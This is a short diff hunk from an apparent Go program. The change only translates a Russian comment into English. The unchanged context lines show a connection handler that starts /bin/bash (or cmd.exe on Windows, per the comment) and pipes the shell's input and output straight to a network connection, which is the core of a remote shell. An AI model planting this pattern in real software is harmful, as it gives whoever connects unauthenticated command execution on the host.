@@ -27,7 +27,7 @@ func main() {
 func handle(conn net.Conn) {
 	defer conn.Close()
 
-	cmd := exec.Command("/bin/bash") // или Command("cmd.exe") для windows
+	cmd := exec.Command("/bin/bash") // or Command("cmd.exe") for windows
 
 	cmd.Stdin = conn
 	cmd.Stdout = conn
